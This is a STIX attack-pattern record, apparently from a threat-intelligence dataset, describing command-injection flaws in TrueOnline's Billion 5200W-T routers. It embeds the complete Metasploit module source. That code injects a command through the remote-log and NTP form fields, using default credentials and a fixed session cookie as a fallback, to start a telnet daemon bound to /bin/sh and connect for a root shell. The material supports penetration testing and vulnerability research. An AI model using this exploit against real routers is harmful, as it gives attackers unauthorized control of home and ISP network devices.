{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b652a93-8e83-440c-a6ea-2f4187578ab5",
    "created": "2024-08-14T17:03:22.542893Z",
    "modified": "2024-08-14T17:03:22.542897Z",
    "name": "TrueOnline / Billion 5200W-T Router Unauthenticated Command Injection",
    "description": " TrueOnline is a major ISP in Thailand, and it distributes a customized version of the Billion 5200W-T router. This customized version has at least two command injection vulnerabilities, one authenticated and one unauthenticated, on different firmware versions. This module will attempt to exploit the unauthenticated injection first, and if that fails it will attempt to exploit the authenticated injection. This module was tested in an emulated environment, as the author doesn't have access to the Thai router any more. Any feedback should be sent directly to the module's author, as well as to the Metasploit project. There are other language strings in the firmware, so it is likely that this firmware is not only distributed in Thailand. Other Billion 5200W-T in other countries might be vulnerable too. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/trueonline_billion_5200w_rce.rb",
            "external_id": "trueonline_billion_5200w_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-18369"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-18372"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2017/Jan/40"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/2910"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TrueOnline / Billion 5200W-T Router Unauthenticated Command Injection',\n      'Description'    => %q{\n        TrueOnline is a major ISP in Thailand, and it distributes a customized version of\n        the Billion 5200W-T router. This customized version has at least two command injection\n        vulnerabilities, one authenticated and one unauthenticated, on different firmware versions.\n        This module will attempt to exploit the unauthenticated injection first, and if that fails,\n        it will attempt to exploit the authenticated injection.\n        This module was tested in an emulated environment, as the author doesn't have access to the\n        Thai router any more. Any feedback should be sent directly to the module's author, as well as\n        to the Metasploit project.\n        There are other language strings in the firmware, so it is likely that this firmware is not\n        only distributed in Thailand. Other Billion 5200W-T in other countries might be vulnerable too.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'unix',\n      'References'     =>\n        [\n          ['CVE', '2017-18369'],\n          ['CVE', '2017-18372'],\n          ['URL', 'https://seclists.org/fulldisclosure/2017/Jan/40'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt'],\n          ['URL', 'https://blogs.securiteam.com/index.php/archives/2910']\n        ],\n      'Targets'        =>\n        [\n          [ 'Billion 5200W-T', {}],\n        ],\n      'Privileged'     => true,\n      'Arch'           => ARCH_CMD,\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n      'DisclosureDate'  => '2016-12-26',\n      'DefaultTarget'   => 0))\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptInt.new('TelnetPort', [true, \"Telnet port we're going to use\", 9090]),\n        OptString.new('HttpUsername', [true, 'Username for the web interface (using default credentials)', 'admin']),\n        OptString.new('HttpPassword', [true, 'Password for the web interface (using default credentials)', 'password']),\n      ])\n  end\n\n  # no reliable way to check if this router is vulnerable\n\n  def exploit\n    command = \"utelnetd -l /bin/sh -p #{datastore['TelnetPort']} -d\"\n\n    print_status(\"#{peer} - Attempting to exploit unauthenticated injection\")\n    res = send_request_cgi({\n      'uri'     => '/cgi-bin/adv_remotelog.asp',\n      'method'  => 'POST',\n      'vars_post' => {\n        'RemotelogEnable' => '1',\n        'syslogServerAddr' => \"1.1.1.1;#{command};#\",\n        'serverPort' => '514'\n      }\n    })\n\n    if res && res.code == 404\n      print_error(\"#{peer} - Well that failed, trying the authenticated one...\")\n\n      cookie = \"SESSIONID=#{rand_text_alpha_lower(8)}\"\n\n      # \"fixate\" the cookie we want - just send a GET request first, we will get a 403 but on the next\n      # request the router will accept our cookie as valid\n      send_request_raw({\n          'uri'     => '/',\n          'method'  => 'GET',\n          'headers' => { 'Cookie' => cookie }\n      })\n\n      sleep 2\n\n      body = \"SaveTime=1&uiCurrentTime2=&uiCurrentTime1=&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=0&uiwPCdateDay=&uiwPCdateYear=&uiwPCdateHour=&uiwPCdateMinute=&uiwPCdateSec=&uiCurTime=N%2FA+%28NTP+server+is+connecting%29&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B07%3A00&uiViewdateDS=Disable&uiViewSNTPServer=\\\"%3b#{command.gsub(\" \", \"+\")}%26%23&ntp2ServerFlag=N%2FA&ntp3ServerFlag=N%2FA\"\n\n      # send_request_raw will send the HttpUsername and HttpPassword automatically if it finds a challenge\n      send_request_raw({\n        'uri'     => '/cgi-bin/tools_time.asp',\n        'method'  => 'POST',\n        'headers' => {\n          'Content-Type' => 'application/x-www-form-urlencoded',\n          'Cookie'       => cookie\n        },\n        'data'    => body\n      })\n\n      sleep 3\n    end\n\n    begin\n      ctx = { 'Msf' => framework, 'MsfExploit' => self }\n      sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => datastore['TelnetPort'], 'Context' => ctx, 'Timeout' => 10 })\n      if not sock.nil?\n        print_good(\"#{peer} - Success, shell incoming!\")\n        return handler(sock)\n      end\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n      sock.close if sock\n    end\n\n    fail_with(Failure::Unknown, \"#{peer} - Failed to exploit router.\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-12-26",
    "x_mitre_platforms": [
        "unix'"
    ]
}